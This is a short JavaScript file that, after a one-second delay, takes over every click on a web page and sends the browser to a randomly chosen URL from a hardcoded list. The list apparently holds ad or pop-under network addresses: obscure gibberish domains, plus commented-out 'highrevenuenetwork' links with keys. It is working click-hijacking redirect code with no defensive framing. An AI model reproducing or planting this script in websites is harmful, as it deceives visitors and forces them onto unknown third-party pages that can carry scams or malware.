function init() {
  var arr = [
    // mon: Lucy
    // "https://kaushichie.net/4/7683316",
    "https://grapseex.com/4/7683319",
    "https://nawhaurgoas.com/4/7683320",
    "https://zaltaumi.net/4/7683322",
    "https://gouthishoust.net/4/7683324",

    // "https://stongoapti.net/4/7683326",
    // "https://psaurdard.net/4/7683327",
    // "https://megroarsoy.net/4/7683328",
    // "https://thaudray.com/4/7683329",
    "https://psaupteer.net/4/7683330",

    // beta: MichaelB
    // "https://www.highrevenuenetwork.com/gb8vbsq1?key=6587782e3c4b34dc08af46dc57905ec3",
    // "https://www.highrevenuenetwork.com/savzdaxzh?key=fb74231bf66680c150fcf853750599a0",
    // "https://www.highrevenuenetwork.com/uqcp54acph?key=8c362762e5c45e090921f3314a6c063d",
    // "https://www.highrevenuenetwork.com/wy40r2rf0g?key=b16446c296943c97cec2b0dc24cf7cd1",
    // "https://www.highrevenuenetwork.com/n4syhay51?key=580080ad4ac1a8d657532faaa78129e6",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 10000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);